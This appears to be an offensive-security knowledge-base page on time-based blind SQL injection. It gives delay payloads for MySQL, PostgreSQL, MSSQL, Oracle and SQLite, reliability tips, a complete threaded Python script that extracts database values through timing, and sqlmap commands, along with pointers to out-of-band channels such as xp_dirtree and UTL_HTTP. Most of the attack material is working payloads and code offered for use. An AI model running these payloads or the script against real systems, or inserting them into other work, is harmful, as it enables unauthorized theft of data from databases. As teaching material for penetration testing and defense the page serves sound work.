---
title: "SQL Injection - Time-Based Blind"
category: web
subcategory: sqli
type: technique
tags: [sqli, sql-injection, blind-sqli, time-based, sleep, benchmark, pg-sleep, waitfor-delay, dbms-pipe, randomblob, heavy-query, exfiltration, mysql, postgres, mssql, oracle, sqlite, sqlmap, burp]
difficulty: medium
summary: "When nothing in the response changes, make the server pause. A conditional SLEEP turns response latency into a 1-bit oracle."
when_to_use:
  - "The response is byte-identical for `AND 1=1` and `AND 1=2` (no content, no status, no length difference)"
  - "The injection is in an INSERT/UPDATE/DELETE whose result is never rendered"
  - "The endpoint returns a fixed 200 'ok' JSON regardless of input"
  - "The sink is a fire-and-forget background job, a log write, or an async webhook"
tools: [sqlmap, burp, curl]
---

## TL;DR

`AND IF(<cond>, SLEEP(5), 0)` -- if the page takes 5 extra seconds, the condition was true.
Same binary search as boolean-blind, but every bit costs real wall-clock time and network noise can
flip a bit. Build in median-of-N timing, an adaptive threshold, and verification passes.

## Recognise it

- `' AND SLEEP(5)-- -` makes the request take ~5s; `' AND SLEEP(0)-- -` returns instantly.
- `'; WAITFOR DELAY '0:0:5'-- -` (MSSQL, needs stacked queries) does the same.
- Timing is only meaningful relative to a baseline. Measure the clean request 10 times first.
- A slow endpoint (3s baseline, +-2s jitter) is NOT a usable time oracle at DELAY=5. Push DELAY up,
  or find a cheaper oracle.
- A CDN/WAF with a hard 30s or 60s upstream timeout caps your DELAY and will turn a true into a 504
  (which is still a signal -- just use the status code).

## Theory

### Delay primitives per engine

**MySQL / MariaDB**

```sql
-- straight sleep in a boolean context (works because SLEEP returns 0)
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND (SELECT SLEEP(5) FROM dual WHERE (SELECT substr(database(),1,1))='c')-- -
-- CPU-burn alternative when SLEEP is blacklisted
' AND BENCHMARK(5000000,SHA1(0x41))-- -
' AND IF(1=1,BENCHMARK(10000000,MD5(0x41)),0)-- -
-- regexp-based heavy query (catastrophic backtracking), works with no function allowlist
' AND 'a' RLIKE concat(repeat('(a+)+$',10))-- -
```

`SLEEP()` inside a `WHERE` runs **once per row scanned**. `... WHERE id=1 AND SLEEP(5)` on a 1000-row
table scan is a 5000-second query. Always anchor to a single row, or use
`(SELECT SLEEP(5))` as a scalar subquery.

**PostgreSQL**

```sql
' AND (SELECT pg_sleep(5))IS NOT NULL-- -
' AND CASE WHEN (substr(current_database(),1,1)='c') THEN pg_sleep(5) ELSE pg_sleep(0) END IS NOT NULL-- -
-- no pg_sleep? burn CPU
' AND (SELECT count(*) FROM generate_series(1,10000000))>0-- -
' AND (SELECT count(*) FROM pg_stat_activity a, pg_stat_activity b, pg_stat_activity c)>0-- -
```

**Microsoft SQL Server**

```sql
-- needs stacked queries or a context where a statement can follow
'; WAITFOR DELAY '0:0:5'-- -
'; IF (SELECT SUBSTRING(DB_NAME(),1,1))='c' WAITFOR DELAY '0:0:5'-- -
-- in-expression alternative: heavy cross join
' AND (SELECT count(*) FROM sysusers a, sysusers b, sysusers c, sysusers d)>0-- -
```

**Oracle**

```sql
-- the classic; needs EXECUTE on dbms_pipe (often granted to PUBLIC)
' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE 1 END FROM dual)-- -
-- no dbms_pipe: heavy query
' AND 1=(SELECT count(*) FROM all_objects a, all_objects b)-- -
-- HTTP-based delay (also an OOB channel)
' AND 1=(SELECT utl_http.request('http://127.0.0.1:1/') FROM dual)-- -
```

**SQLite** -- there is no sleep function at all. Use a heavy expression:

```sql
-- randomblob forces N bytes of RNG work; 1e9 ~ a couple of seconds
' AND 1=(SELECT CASE WHEN (substr((SELECT name FROM sqlite_master LIMIT 1),1,1)='u')
         THEN like('a%',char(97)||randomblob(1000000000)) ELSE 1 END)-- -
-- simpler: hash a big blob
' AND CASE WHEN (1=1) THEN hex(randomblob(500000000)) ELSE 1 END-- -
-- recursive CTE burn (portable, tune the bound)
' AND (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<3000000) SELECT count(*) FROM c)>0-- -
```

Calibrate the `randomblob` size once against the target: start at 10^8 and scale until you see ~3s.

### Conditional templates

The shape is always the same -- turn the delay on only when the predicate holds:

```sql
MySQL     IF(<cond>, SLEEP(D), 0)
Postgres  CASE WHEN <cond> THEN pg_sleep(D) ELSE pg_sleep(0) END
MSSQL     IF (<cond>) WAITFOR DELAY '0:0:D'
Oracle    CASE WHEN <cond> THEN dbms_pipe.receive_message('x',D) ELSE 1 END
SQLite    CASE WHEN <cond> THEN <randomblob burn> ELSE 1 END
```

### Making it reliable

- **Baseline**: sample the clean request N times, take the median `t0` and the 95th percentile `t95`.
- **Threshold**: `t95 + D/2`. If `elapsed > threshold` -> true.
- **Median-of-3 on ambiguity**: if `elapsed` lands within 30% of the threshold, re-run and take the majority.
- **Verify**: after extracting a value, re-test `value = <extracted>` once. One request validates 7*len bits.
- **Threads**: helpful, but too many threads on a single-worker backend serialise your sleeps and
  destroy the timing. 4-8 is usually the sweet spot; test with a known-true payload at each level.

## Attack

1. Measure the baseline latency distribution (>= 10 samples).
2. Prove the delay primitive: send `AND SLEEP(5)` and confirm ~baseline+5.
3. Prove the conditional: `IF(1=1,SLEEP(5),0)` slow, `IF(1=2,SLEEP(5),0)` fast.
4. Fingerprint by trying each engine's primitive until one delays.
5. Bisect the length, then each character, exactly as in boolean-blind.
6. Verify the whole string with a single equality check.

## Code

```python
#!/usr/bin/env python3
"""Time-based blind SQLi exfiltration with an adaptive threshold and majority voting.

Usage:
    python3 time_blind.py "http://127.0.0.1:8000/item.php?id=1" mysql "SELECT database()"

Engines: mysql | postgres | mssql | oracle | sqlite
"""
from __future__ import annotations

import concurrent.futures
import statistics
import sys
import time
import urllib.parse

import requests

DELAY = 3.0
THREADS = 6
TIMEOUT = 40

# Each template takes {cond} and {d}; {d} is the delay in seconds.
TEMPLATES = {
    "mysql":    "' AND IF(({cond}),SLEEP({d}),0)-- -",
    "postgres": "' AND (CASE WHEN ({cond}) THEN pg_sleep({d}) ELSE pg_sleep(0) END) IS NOT NULL-- -",
    "mssql":    "'; IF ({cond}) WAITFOR DELAY '0:0:{d}'-- -",
    "oracle":   "' AND 1=(SELECT CASE WHEN ({cond}) THEN dbms_pipe.receive_message('a',{d}) ELSE 1 END FROM dual)-- -",
    "sqlite":   "' AND (CASE WHEN ({cond}) THEN like('a%',char(97)||hex(randomblob(300000000))) ELSE 1 END)-- -",
}
SUBSTR = {"mysql": "SUBSTRING", "mssql": "SUBSTRING", "postgres": "substr", "oracle": "SUBSTR", "sqlite": "substr"}
ASCII_FN = {"mysql": "ASCII", "mssql": "ASCII", "postgres": "ascii", "oracle": "ASCII", "sqlite": "unicode"}
LEN_FN = {"mysql": "LENGTH", "mssql": "LEN", "postgres": "length", "oracle": "LENGTH", "sqlite": "length"}

SESSION = requests.Session()
SESSION.headers["User-Agent"] = "Mozilla/5.0"
THRESHOLD = DELAY * 0.6


def build(url: str, payload: str) -> str:
    parts = urllib.parse.urlsplit(url)
    qs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    if not qs:
        raise SystemExit("[-] target needs a query parameter")
    k, v = qs[-1]
    qs[-1] = (k, v + payload)
    q = "&".join(f"{a}={urllib.parse.quote(b, safe='')}" for a, b in qs)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, q, parts.fragment))


def timed(url: str, payload: str) -> float:
    start = time.perf_counter()
    try:
        SESSION.get(build(url, payload), timeout=TIMEOUT)
    except requests.exceptions.ReadTimeout:
        return float(TIMEOUT)
    except requests.RequestException:
        return 0.0
    return time.perf_counter() - start


def calibrate(url: str, samples: int = 8) -> float:
    """Return the decision threshold above the clean baseline."""
    global THRESHOLD
    times = [timed(url, "") for _ in range(samples)]
    base = statistics.median(times)
    spread = max(times) - base
    THRESHOLD = base + max(DELAY * 0.5, spread * 1.5)
    print(f"[*] baseline median={base:.2f}s spread={spread:.2f}s threshold={THRESHOLD:.2f}s")
    return THRESHOLD


def oracle(url: str, engine: str, cond: str, votes: int = 1) -> bool:
    """True iff the condition held. Re-votes when the measurement is ambiguous."""
    payload = TEMPLATES[engine].format(cond=cond, d=int(DELAY))
    t = timed(url, payload)
    if abs(t - THRESHOLD) < DELAY * 0.25 and votes < 3:
        results = [oracle(url, engine, cond, votes + 1) for _ in range(2)]
        results.append(t > THRESHOLD)
        return sum(results) >= 2
    return t > THRESHOLD


def detect_engine(url: str) -> str:
    for eng in ("mysql", "postgres", "mssql", "sqlite", "oracle"):
        if oracle(url, eng, "1=1"):
            print(f"[+] delay primitive works: {eng}")
            return eng
    return ""


def get_length(url: str, engine: str, expr: str, cap: int = 512) -> int:
    lo, hi = 0, cap
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(url, engine, f"{LEN_FN[engine]}(({expr}))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def char_at(url: str, engine: str, expr: str, idx: int) -> str:
    lo, hi = 31, 126
    while lo < hi:
        mid = (lo + hi + 1) // 2
        cond = f"{ASCII_FN[engine]}({SUBSTR[engine]}(({expr}),{idx},1))>={mid}"
        if oracle(url, engine, cond):
            lo = mid
        else:
            hi = mid - 1
    return chr(lo) if lo >= 32 else ""


def extract(url: str, engine: str, expr: str) -> str:
    n = get_length(url, engine, expr)
    print(f"[+] length={n}")
    if n <= 0:
        return ""
    out = [""] * n
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as pool:
        futs = {pool.submit(char_at, url, engine, expr, i + 1): i for i in range(n)}
        for fut in concurrent.futures.as_completed(futs):
            out[futs[fut]] = fut.result()
            sys.stderr.write(f"\r[*] {''.join(c or '?' for c in out)}")
    sys.stderr.write("\n")
    return "".join(out)


def main() -> None:
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000/item.php?id=1"
    engine = sys.argv[2] if len(sys.argv) > 2 else ""
    expr = sys.argv[3] if len(sys.argv) > 3 else "SELECT database()"
    calibrate(url)
    engine = engine or detect_engine(url)
    if not engine:
        print("[-] no delay primitive fired; SLEEP may be filtered or the sink is async")
        return
    value = extract(url, engine, expr)
    print(f"[+] value = {value!r}")
    if value:
        ok = oracle(url, engine, f"({expr})='{value}'")
        print(f"[*] verification: {'OK' if ok else 'MISMATCH - re-run with a larger DELAY'}")


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **`SLEEP` per row.** In a `WHERE` over a large table the delay multiplies. Wrap in a scalar subquery:
  `(SELECT SLEEP(5))`, or add `LIMIT 1`.
- **Async sinks.** If the query runs in a background worker, the HTTP response returns before the
  SQL does and time-based dies. Look for an OOB channel instead (DNS, `LOAD_FILE('\\\\host\\x')`,
  `xp_dirtree`, `UTL_HTTP.request`).
- **Connection pooling / prepared statements** may cache the plan; the sleep still runs.
- **Upstream timeouts.** A 30s gateway timeout means DELAY must be < 30 including baseline.
  A 504 on true is a fine oracle -- key on the status code instead of the clock.
- **Parallel sleeps serialise** on a single-threaded backend (PHP built-in server, sqlite with a
  global lock). Drop to 1 thread and raise DELAY.
- **MSSQL `WAITFOR` needs a statement position**, so it requires stacked queries (`;`). Inside a
  pure expression context use the cross-join heavy query instead.
- **Oracle `dbms_pipe.receive_message`** may be revoked. `utl_http.request` to a dead port gives a
  connect-timeout delay and doubles as an OOB test.
- **Cost math.** 7 requests/char at 3s = 21s/char serial. A 32-char hash is 11 minutes at 1 thread,
  ~2 minutes at 6. Always narrow the charset first (hex -> 4 requests/char).

## Tools

- `sqlmap -u URL --technique=T --time-sec=3 --threads=4 --dbms=mysql --dump`
- `sqlmap --time-sec=10` on a noisy network; `--delay=0.5` to dodge rate limits.
- Burp Repeater shows the response time in the bottom-right; Burp Intruder's "Response received" column
  makes a quick manual sweep readable.
- `curl -o /dev/null -s -w '%{time_total}\n' 'URL'` for one-off timing checks.

## References

- PortSwigger Web Security Academy -- Blind SQL injection: https://portswigger.net/web-security/sql-injection/blind
- PayloadsAllTheThings -- SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings
- sqlmap: https://github.com/sqlmapproject/sqlmap
